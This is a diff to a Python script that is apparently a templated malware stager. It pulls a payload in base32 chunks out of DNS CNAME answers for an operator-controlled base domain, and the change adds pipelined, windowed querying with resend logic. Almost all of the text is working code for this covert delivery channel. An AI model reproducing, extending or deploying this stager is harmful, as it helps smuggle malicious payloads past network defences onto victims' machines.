@@ -5,6 +5,7 @@ import base64
 import hashlib
 import random
 import re
+import select
 import socket
 import struct
 import subprocess
@@ -21,11 +22,19 @@ SFB_ARGS = {{SFB_ARGS}}
 COUNT_NAME = '%s.count.%s' % (STAGER_NONCE, BASE_DOMAIN)
 PIECE_FMT = '%s.%%05d.%s' % (STAGER_NONCE, BASE_DOMAIN)
 TIMEOUT = 2.0
+PIPELINE_WINDOW = 8
+PIPELINE_RESEND_AFTER = 0.5
+PIPELINE_WAIT = 0.2
 
 try:
     text_type = unicode
 except NameError:
     text_type = str
+
+try:
+    _now = time.monotonic
+except AttributeError:
+    _now = time.time
 
 
 def _byte_at(data, index):
@@ -103,28 +112,31 @@ def _read_name(packet, offset):
 
 def _parse_cname(packet):
     if not packet or len(packet) < 12:
-        return None
+        return None, None
     header = packet[:12]
     _, _, qdcount, ancount, _, _ = struct.unpack('>HHHHHH', header)
     offset = 12
+    qname = None
     for _ in range(qdcount):
         name, offset = _read_name(packet, offset)
         if name is None or offset + 4 > len(packet):
-            return None
+            return None, None
+        if qname is None:
+            qname = name
         offset += 4
     for _ in range(ancount):
         name, offset = _read_name(packet, offset)
         if name is None or offset + 10 > len(packet):
-            return None
+            return qname, None
         rtype, rclass, _, rdlen = struct.unpack('>HHIH', packet[offset:offset + 10])
         offset += 10
         if offset + rdlen > len(packet):
-            return None
+            return qname, None
         if rtype == 5 and rclass == 1:
             cname, _ = _read_name(packet, offset)
-            return cname
+            return qname, cname
         offset += rdlen
-    return None
+    return qname, None
 
 
 def _decode_cname(name):
@@ -148,8 +160,9 @@ def _decode_cname(name):
     return _b32decode(b32)
 
 
-def _build_query(name):
-    dns_id = random.randint(0, 0xFFFF)
+def _build_query(name, dns_id=None):
+    if dns_id is None:
+        dns_id = random.randint(0, 0xFFFF)
     header = struct.pack('>HHHHHH', dns_id, 0x0100, 1, 0, 0, 0)
     question = _encode_name(name) + struct.pack('>HH', 1, 1)
     return dns_id, header + question
@@ -177,7 +190,8 @@ def _query(name, resolver):
     resp_id = struct.unpack('>H', data[:2])[0]
     if resp_id != dns_id:
         return None
-    return _parse_cname(data)
+    _, cname = _parse_cname(data)
+    return cname
 
 
 def _fetch_count(resolver):
@@ -199,17 +213,81 @@ def _fetch_count(resolver):
 
 def _fetch_chunks(resolver, count):
     chunks = {}
-    while len(chunks) < count:
-        for index in range(1, count + 1):
-            if index in chunks:
-                continue
-            cname = _query(PIECE_FMT % index, resolver)
-            if not cname:
-                continue
-            payload = _decode_cname(cname)
-            if payload is None:
-                continue
-            chunks[index] = payload
+    if count <= 0:
+        return chunks
+    window = PIPELINE_WINDOW
+    if count < window:
+        window = count
+    pending = {}
+    pending_ids = {}
+    next_index = 1
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setblocking(0)
+    try:
+        while len(chunks) < count:
+            now = _now()
+            while len(pending) < window and next_index <= count:
+                index = next_index
+                next_index += 1
+                name = PIECE_FMT % index
+                while True:
+                    dns_id, packet = _build_query(name)
+                    if dns_id not in pending_ids:
+                        break
+                try:
+                    sock.sendto(packet, (resolver, 53))
+                except (socket.error, OSError):
+                    pass
+                pending[index] = {'id': dns_id, 'last_sent': now}
+                pending_ids[dns_id] = index
+            pending_indices = []
+            for index in pending:
+                pending_indices.append(index)
+            for index in pending_indices:
+                info = pending.get(index)
+                if not info:
+                    continue
+                if now - info['last_sent'] < PIPELINE_RESEND_AFTER:
+                    continue
+                _, packet = _build_query(PIECE_FMT % index, info['id'])
+                try:
+                    sock.sendto(packet, (resolver, 53))
+                except (socket.error, OSError):
+                    pass
+                info['last_sent'] = now
+            wait = PIPELINE_WAIT
+            while True:
+                readable, _, _ = select.select([sock], [], [], wait)
+                if not readable:
+                    break
+                wait = 0
+                try:
+                    data, _ = sock.recvfrom(4096)
+                except (socket.error, OSError):
+                    break
+                if not data or len(data) < 2:
+                    continue
+                resp_id = struct.unpack('>H', data[:2])[0]
+                index = pending_ids.get(resp_id)
+                if index is None:
+                    continue
+                qname, cname = _parse_cname(data)
+                if not qname:
+                    continue
+                expected = PIECE_FMT % index
+                if qname.lower() != expected.lower():
+                    continue
+                if not cname:
+                    continue
+                payload = _decode_cname(cname)
+                if payload is None:
+                    continue
+                chunks[index] = payload
+                del pending_ids[resp_id]
+                if index in pending:
+                    del pending[index]
+    finally:
+        sock.close()
     return chunks
 
 
